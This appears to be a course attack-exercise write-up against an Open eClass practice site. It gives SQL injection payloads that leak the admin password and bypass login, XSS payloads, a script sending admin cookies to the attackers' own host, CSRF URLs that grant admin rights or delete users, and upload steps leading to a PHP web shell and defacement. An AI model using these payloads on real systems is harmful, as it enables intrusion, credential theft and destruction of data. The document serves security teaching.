# Table of Contents
<!-- TOC -->

- [Table of Contents](#table-of-contents)
- [Intro](#intro)
- [SQL Injections](#sql-injections)
    - [Upgrade - /upgrade/index.php](#upgrade---upgradeindexphp)
    - [PHPBB - /modules/phpbb/](#phpbb---modulesphpbb)
        - [reply.php](#replyphp)
        - [viewtopic.php](#viewtopicphp)
        - [newtopic.php](#newtopicphp)
    - [Unregister from course - modules/unreguser/unregcours.php](#unregister-from-course---modulesunreguserunregcoursphp)
    - [Work/Assignment - modules/work/work.php](#workassignment---modulesworkworkphp)
    - [Courses Catalog - modules/auth/opencourses.php](#courses-catalog---modulesauthopencoursesphp)
- [XSS](#xss)
    - [Reflected](#reflected)
    - [Stored](#stored)
    - [Further Notes](#further-notes)
- [CSRF](#csrf)
    - [Intro](#intro)
    - [Zoom-e](#zoom-e)
    - [Extra multi](#extra-multi)
- [RFI](#rfi)
    - [Abstract](#abstract)
    - [Intro](#intro)
    - [Dropbox](#dropbox)
    - [Work](#work)
    - [Other RFI locations](#other-rfi-locations)
- [Deface](#deface)
- [Other attack scenarios](#other-attack-scenarios)
- [The "Let me fix your code" attack](#the-let-me-fix-your-code-attack)
- [Free-for-All](#free-for-all)

<!-- /TOC -->

# Intro

- The `Target` team was **sloppy-clowns-0** and their website was to be found @ [http://sloppy-clowns-0.csec.chatzi.org](http://sloppy-clowns-0.csec.chatzi.org).

- Credentials found via the [defacement](#deface) are available in [creds file](./puppies/creds).

- The opposition's website seemed close to the vanilla version provided in the context of this assignment, hence anything goes and this report is rather exhaustive.

- For this reason, and because most attacks are good to go, the main exploitation scenario for defacement will be shown and some additional scenarios of interest in regards of higher complexity and greater reliance and persistence.

- The website's URL mentioned above is considered as the base of the attacks and will not be provided in the attacks below for brevity.

- CSRF and XSS vulnerabilities weren't particularly weaponized (albeit tested), because if you have multiple RCE vectors, why not focus on the highest impact vulnerabilities.

# SQL Injections

SQL Injections have been performed with the following 2 resources in hand. The first explains payloads for the identification of vulnerable sites and authentication bypasses and the second provides help for fully weaponizing UNION-based, blind and time-based attacks.

1. [SQL Injections - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
2. [MySQL Injections specific cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

Below are the main vulnerable sites that provide leeway for information disclosure and auth bypass. Payloads show how to leak the admin's password; they could be customized to print the exact "secret" location of a file uploaded via the [RFI section's](#rfi) attacks.

## Upgrade - `/upgrade/index.php`

We are prompted to login to update the database.
Via this login we submit a POST request to `/upgrade/upgrade.php` where the `login` parameter is vulnerable. We supply the below to become admin, the `password` paramter can be left empty. 

```
' OR user.user_id='1' OR '1'='1
```

## PHPBB - `/modules/phpbb/`

These are injections that can take place in the forum of a course.

### reply.php

UNION based SQL injection @ **topic** parameter

<details> <summary> PoC </summary>
topic=1 AND 12 = 13) UNION SELECT NULL, NULL, NULL, password FROM eclass.user WHERE username="drunkadmin" -- &forum=1

</details> 
<br>



### viewtopic.php

UNION based SQL injection @ **topic** parameter

<details> <summary> PoC </summary>
?topic=1 AND 12 = 13 ) UNION SELECT password, password FROM eclass.user WHERE username="drunkadmin" -- &forum=1

</details> 
<br>

### newtopic.php

UNION based SQL injection @ **forum** parameter.

No PoC.

## Unregister from course - `modules/unreguser/unregcours.php`

UNION based SQL Injection @ **cid** param.

<details> <summary> PoC </summary>
?cid=TMA100' AND 1=3 UNION SELECT password FROM eclass.user WHERE username="drunkadmin" OR 'ACID'='ACID & u=3

</details> 
<br>

## Work/Assignment - `modules/work/work.php`

UNION based SQL Injection @ **id** param.

<details> <summary> PoC </summary>
?id=1' AND 12=31 UNION SELECT NULL,password,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM eclass.user WHERE username="drunkadmin" -- -

</details> 
<br>


## Courses Catalog - `modules/auth/opencourses.php`

Vulnerable at **fc** parameter to UNION based SQL Injection; no PoC.

# XSS

- Resources:
    1. [PayloadAllTheThings -- XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection),
    2. [XSSER tool](https://github.com/epsylon/xsser).

## Reflected
XSS injections can be performed in every URL path of the application by adding a slash and escaping the html element of $_SERVER[PHP_SELF] variable, which is most usually done via `"><script> alert('BOYKA') </script>`.

Some of the above are:
- `/modules/auth/courses.php/"><script>alert(1);</script>`
- `/modules/auth/listfaculte.php/"><script>alert(1);</script>`
- `/modules/auth/courhtmlses.php/"><script>alert(1);</script>`

But any path is vulnerable.

Additionally, the below reflected XSS vulnerability that is not relevant to the `PHP_SELF` vulnerability:

- newuser.php
    `/modules/auth/newuser.php?nom_form='><script>alert(1)</script>`

## Stored

The below is the script that attempts to exploit any stored XSS vulnerability to disclose the admin cookie.

```html
<script>
	document.location='http://melenetzon.puppies.chatzi.org/cookie_recv.php?biscuit='+document.cookie;
</script>
```

Some stored locations can be seen below:

- lostpass.php 
    `/modules/auth/lostpass.php?userName=<script>alert(1213)</script>&email=yury@boyka.ru&doit=Αποστολή`


- work.php -- `name` of uploaded file
- adminannouncements.php -- `message`
- reply.php -- `reply` message

## Further Notes

In a context where CORS or multiple restrictions exist for our XSS payloads we would rationally choose to do an XHR (XML Http Request), that bypasses multiple problems and can be executed along with other **stager** JavaScript code via:

```html
<script src="<our malicious script location in puppies>"></script>
```

# CSRF

- Resource: [PayloadAllTheThings -- CSRF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection).

## Intro
The below CSRF attacks have been performed by hand, after the initial exploitation of the application and having admin access already.

There is some CSRF protection that has shown itself here and there, but it's not functioning properly, therefore allowing most csrf attacks to take place. It can be seen via the [special attack](#the-let-me-fix-your-code-attack), where csrf tokens are all over the code but they fail to be included in post or get requests.

They are successful as far as understanding goes, since in every single form there is nowhere to be found a csrf token in the produced http request.

## Zoom-e

A simple weaponizer would be to inject image elements exploiting the below HTML GET request CSRF's, simply by the admin browsing to the page where the stored XSS lies.

```html
<img src="http://sloppy-clowns-0.csec.chatzi.org/<PAYLOAD>">
```

Scripts with a fetch() call are a go as well.

Below are some of the most interesting stuff we can do:

- `/modules/user/user.php?giveAdmin=4`:  
Gives admin access to user with id == 4 (if drunkadmin is focused on the course).

- `/modules/admin/addfaculte.php?a=2&c=13`:  
Deletes course with cid == 13.

- `/modules/admin/delcours.php?c=TMA102&delete=yes`:  
Deletes a course named TMA102, or anything else you want.

- `/modules/admin/unreguser.php?u=9&c=&doit=yes`:  
Deletes user with id == 9.

## Extra multi

Below are 2 CSRF attack forms that when browsed by the admin and clicked make requests we want:
1. GET example [free-tickets.html](./puppies/free-tickets.html),
2. POST example [too-many-puppies](./puppies/too-many-puppies.html). 

Hypothetically, we could also make a CSRF attack to the admin of a course that adds **our** html page which adds an html page to the sidebar and the admin clicks it and then the clicked html page adds an html page that the admin clicks, etc..

The interesting question would be: would the system first start crashing because of too many file descriptors or in a fashion more similar to a fork bomb? My money is on the first due to the docker, but I think it would greatly depend on the docker environment.

# RFI

## Abstract
In this context, `RFI` refers to **Remote File Inclusion** and can be sometimes be confused with `LFI` (Local File Inclusion).
The methodologies used in the context of this application refer to uploading files to achieve RFI (`localize` doesn't count).

[More on Upload bypass and exploitation](https://book.hacktricks.xyz/pentesting-web/file-upload).


## Intro
There is no protection for directory listing, meaning that when we upload a file, even though there is by default some randomization on it's name we can just list the folder of the course, either `/dropbox/` or `/work/` and find it's name.

Additionally, there is no filtering or post-processing to the uploaded files, meaning we can achieve code execution (RCE) easily by providing our own PHP code, either via a .php, .pht or a multitude of other extensions.

## Dropbox

Make a user and enroll in the course. Go to file exchange and upload a php file (i.e [cmd.php](./puppies/cmd.php)). List the directory by going to `<URL>/courses/<course>/dropbox/`, the file is clickable and will be executed by the web server.

In this context we can achieve code executio

## Work

`/modules/work/work.php`, was malfunctioning after several rounds of attacks so a de facto test could not be performed without a reset of the app.

Regardless, the methodology would be to proceed as above by trying to bypass the upload form to include our own executable code (.php, .php5, etc; formats that the Apache2 web server would interpret as code and execute). Then proceed with finding the path of the uploaded file and achieving RCE.

- If there were protections set up in place, bypass them; i.e. the saved file would be saved as non executable, then we could try to bypass the upload location and achieve arbitrary file write and try to change the configuration of webapp to allow ourselves in.

- In case, of changed extension on save, we could try to use a NULL byte exploit, which is a predominant security vulnerability in PHP5.

## Other RFI locations
- `/modules/course_tools/course_tools.php`, by uploading a site in the course (described in [deface](#deface)).
- `/modules/import/import.php`.
- `/modules/document/document.php`, (**Course Admin only**, after enabling the module), **BUT** it has been entirely deleted by the opponent team.


# Deface

1. Browse to `/upgrade/index.php`.

2. Auth bypass with [upgrade auth bypass vulnerability](#upgradeindexphp) to become admin

3. Go to `modules/admin/eclassconf.php` and get MySQL credentials (the mysql pass is the same for the drunkadmin user in this scenario, but in general these 2 should defer).

4. From there browse to `/modules/admin/mysqli` or just click the `Database management (phpMyAdmin)`. Login with the found mysql credentials and extract the password of the admin user (hashed).

5. Go to active Course TMA100, and select `Tool Activation` as admin of the course.

6. Try to upload a webpage via `modules/course_tools/course_tools.php?action=1`, aka website upload. The same can be done via `modules/import/import.php`.

7. It accepts only html pages, but we can easily bypass with a multitude of ways, such as a proxy or upload option.

8. Initially I uploaded a php reverse shell. It timed-out; potentially due to the docker environment the application is in.

9. Upload [art_power](./puppies/art_power) funky webpage that we want to substitute for index.php in the root of the app. Then upload and click [deface2.php](./puppies/deface2.php) script.

10. Alternatively we could use the [cmd.php](./puppies/cmd.php) script and achieve command execution inside the Linux environment via the cmd GET parameteter.


# Other attack scenarios

1. Get admin cookie via XSS && CSRF -> become admin and proceed as above.

2. Make my user an admin of the course and proceed with fetching the `Αντίγραφο ασφαλείας του μαθήματος`, inside there is a `backup.php` file with all the users enrolled in the course and if admin is enrolled we get his/her credentials.

3. Command execution via RFI on dropbox and work.

# The "Let me fix your code" attack

Using the aforementioned [cmd.php](./puppies/cmd.php) file we can run commands in the system.

Running `tar czvf ../../../eclass.tgz /var/www/openeclass/` gives us a tarball at the `/openeclass.tgz` path of the site allowing us to inspect the source code and instrument properly the all of our attacks.

Upon review of the source code it's possible to reach certain conclusions that were already suspicions while initially testing the site:
    a. There is no sanitization on the PHP_SELF value, meaning that in most pages the `$_SERVER['PHP_SELF']` value is vulnerable to XSS. 
    b. CSRF protection is not enabled for most of the pages.
    c. RFI on `dropbox` and `work` modules is unprotected.

# Free-for-All

For the purposes of the Free4ll phase (if it takes place) the script [autosploit.py](./puppies/autosploit.py) has been created with the above mentioned context.